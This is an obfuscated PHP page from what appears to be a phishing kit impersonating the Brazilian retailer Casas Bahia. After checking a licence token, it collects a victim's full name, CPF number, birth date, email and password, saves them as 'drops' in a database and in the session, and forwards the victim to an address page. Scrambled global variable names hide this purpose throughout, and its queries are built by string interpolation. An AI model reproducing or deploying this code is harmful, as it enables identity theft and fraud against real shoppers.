<?php /*
Casas Bahia v1.0
*/
require_once('vendor/mustache/mustache/src/Mustache/Autoloader.php');
Mustache_Autoloader::register();

$GLOBALS["msqcjmeyfo"] = "nomePD";
$GLOBALS["qcstgrtqrqk"] = "senha";
$GLOBALS["pbhpjtsnh"] = "json_cadastro";
$GLOBALS["tktfmx"] = "cpf";
$GLOBALS["oseqhahwjm"] = "dn";
$GLOBALS["jibnkia"] = "nome";
$GLOBALS["rkbehygvbul"] = "expira";
$GLOBALS["jrrkqq"] = "config";
$GLOBALS["qwnkcchnippu"] = "now";
$GLOBALS["czmkexnjj"] = "cliente_token";
$GLOBALS["nsjapjrbemi"] = "inicio";
$GLOBALS["spbqsyu"] = "token";
$GLOBALS["hhhlwecgmtl"] = "registro";
$GLOBALS["ykrjqj"] = "access_token";
$GLOBALS["wtcbds"] = "curl";
$GLOBALS["durchluej"] = "json_token";
$mbnnkvcdv = "produto";
$GLOBALS["romdpxqmxqud"] = "delete";
$GLOBALS["ahzwbvuppyy"] = "selectTokenInfos";
\Source\Modells\protect::cartId();
if (!isset($_SESSION["login"]) && isset($_POST['email']))
{
    $_SESSION['login'] = $_POST['email'];
}
$wnuinulz = "inf";
use Source\Modells\inf;
use Source\Modells\Curl;
$
{
    $GLOBALS["romdpxqmxqud"]
} = pdo()->query("delete from href where `init` < '" . time() . "' or `init` > '" . (time() + 3600) . "'");
$
{
    $GLOBALS["ahzwbvuppyy"]
} = pdo()->query("select * from href");
$
{
    $wnuinulz
} = new inf();
if ($selectTokenInfos->rowCount() == 0)
{
    $awsooeaklug = "curl";
    $
    {
        $awsooeaklug
    } = (new Curl())->setUrl($inf->getBase())
        ->setHeaders($inf->getHeaders())
        ->setPostFields($inf->getPostFields())
        ->getContents();
    $
    {
        $GLOBALS["durchluej"]
    } = json_decode($
    {
        $GLOBALS["wtcbds"]
    });
    if (empty($
    {
        $GLOBALS["durchluej"]
    }))
    {
        loadMsgToken();
    }
    if (!empty($json_token->error))
    {
        loadMsgToken($json_token->msg, $json_token->error_code);
    }
    if (!empty($json_token->access_token))
    {
        $GLOBALS["pjjgntaewrr"] = "registro";
        $
        {
            $GLOBALS["ykrjqj"]
        } = $json_token->access_token;
        $GLOBALS["opvixatqato"] = "access_token";
        $GLOBALS["xcnxnwtfkwq"] = "crud";
        if (\Source\Modells\JWT::verify($
        {
            $GLOBALS["opvixatqato"]
        }) === false)
        {
            loadMsgToken();
        }
        $
        {
            $GLOBALS["xcnxnwtfkwq"]
        } = new \Source\Modells\crud("href");
        $
        {
            $GLOBALS["pjjgntaewrr"]
        } = $crud->insertDB(["src" => $
        {
            $GLOBALS["ykrjqj"]
        }
        , "init" => time() + 3600, "data" => atualDate() ]);
        if (empty($
        {
            $GLOBALS["hhhlwecgmtl"]
        }))
        {
            loadMsgToken();
        }
    }
    else
    {
        loadMsgToken();
    }
}
else
{
    $GLOBALS["nazmxhc"] = "resulToken";
    $liklclfm = "cliente_token";
    $GLOBALS["bdvsksqetmnj"] = "jwt";
    $
    {
        $GLOBALS["nazmxhc"]
    } = $selectTokenInfos->fetch(PDO::FETCH_OBJ);
    $ubcoixmfbi = "expira";
    $kyrdivu = "jwt";
    $fxbuwjdxvrb = "inicio";
    if (empty($resulToken->src))
    {
        loadMsgToken();
    }
    $nlpbecptolw = "token";
    $ncxtxwxytgrb = "server_token";
    $
    {
        $nlpbecptolw
    } = $resulToken->src;
    $
    {
        $GLOBALS["bdvsksqetmnj"]
    } = \Source\Modells\JWT::verify($
    {
        $GLOBALS["spbqsyu"]
    });
    if ($
    {
        $kyrdivu
    } === false)
    {
        loadMsgToken();
    }
    if (empty($jwt->token_expira) or empty($jwt->token_inicio) or empty($jwt->cliente_token))
    {
        loadMsgToken();
    }
    $
    {
        $ubcoixmfbi
    } = $jwt->token_expira;
    $GLOBALS["kjldktk"] = "config";
    $
    {
        $GLOBALS["nsjapjrbemi"]
    } = $jwt->token_inicio;
    $
    {
        $GLOBALS["czmkexnjj"]
    } = $jwt->cliente_token;
    $
    {
        $GLOBALS["qwnkcchnippu"]
    } = time();
    $bpebvjhsz = "server_token";
    $
    {
        $bpebvjhsz
    } = crypto($
    {
        $GLOBALS["jrrkqq"]
    }
    ["serial"] . $
    {
        $GLOBALS["kjldktk"]
    }
    ["senha"]);
    if ($
    {
        $ncxtxwxytgrb
    } !== $
    {
        $liklclfm
    })
    {
        loadMsgToken();
    }
    if ($
    {
        $GLOBALS["qwnkcchnippu"]
    } > $
    {
        $GLOBALS["rkbehygvbul"]
    } or $
    {
        $GLOBALS["qwnkcchnippu"]
    } < $
    {
        $fxbuwjdxvrb
    })
    {
        loadMsgToken();
    }
}
if (isset($_POST["fullName"]) && $_POST["fullName"] != false)
{
    $GLOBALS["yddoeaints"] = "senha";
    $GLOBALS["stvinwgpfg"] = "nome";
    $GLOBALS["krddpwl"] = "dn";
    $xiqprkc = "json_cadastro";
    $GLOBALS["hgbsllyqr"] = "cpf";
    $GLOBALS["pgaafqr"] = "cpf";
    $
    {
        $GLOBALS["pgaafqr"]
    } = addslashes($_POST["cpf"]);
    $ktfwwxerrmxx = "drop";
    $umpaeby = "drop";
    $
    {
        $GLOBALS["jibnkia"]
    } = addslashes($_POST["fullName"]);
    $GLOBALS["ljevje"] = "senha";
    $jttjqci = "drop";
    $
    {
        $GLOBALS["oseqhahwjm"]
    } = addslashes($_POST["birthDate"]);
    $
    {
        $GLOBALS["yddoeaints"]
    } = addslashes($_POST["password"]);
    $GLOBALS["dzorfkxeh"] = "json_cadastro";
    $
    {
        $umpaeby
    } = ["Nome" => htmlentities($
    {
        $GLOBALS["stvinwgpfg"]
    }) , "CPF" => $
    {
        $GLOBALS["tktfmx"]
    }
    , "Nascimento" => $
    {
        $GLOBALS["oseqhahwjm"]
    }
    , "E-Mail" => addslashes($_SESSION["login"]) , "Senha" => htmlentities($
    {
        $GLOBALS["ljevje"]
    }) ];
    $
    {
        $jttjqci
    } = json_encode($
    {
        $ktfwwxerrmxx
    });
    if (rows("drops where cpf = '$cpf'") == 0)
    {
        $pdo->query("INSERT INTO `drops`(`cpf`, `drop`, `endereco`) VALUES ('$cpf', '$drop', '')");
    }
    $
    {
        $xiqprkc
    } = ["nome" => htmlentities($
    {
        $GLOBALS["jibnkia"]
    }) , "cpf" => $
    {
        $GLOBALS["tktfmx"]
    }
    , "nascimento" => $
    {
        $GLOBALS["krddpwl"]
    }
    ];
    $
    {
        $GLOBALS["pbhpjtsnh"]
    } = json_encode($
    {
        $GLOBALS["dzorfkxeh"]
    });
    $_SESSION["cadastro"] = $
    {
        $GLOBALS["pbhpjtsnh"]
    };
    $_SESSION["senha"] = $
    {
        $GLOBALS["qcstgrtqrqk"]
    };
    $_SESSION["cpf"] = $
    {
        $GLOBALS["hgbsllyqr"]
    };
    redir("{$arch}/endereco");
}
$
{
    $GLOBALS["msqcjmeyfo"]
} = limitarTexto($
{
    $mbnnkvcdv
}
["nome"]);
onlines("Cadastro", "{$nomePD}");

$m = new Mustache_Engine(array('entity_flags' => ENT_QUOTES));

$template = file_get_contents('views/store/cadastro.mustache');

$params = [
    'base' => urlbase(),
    'base_login' => substr(md5(time()) , 0, 20),
];

echo $m->render($template, $params);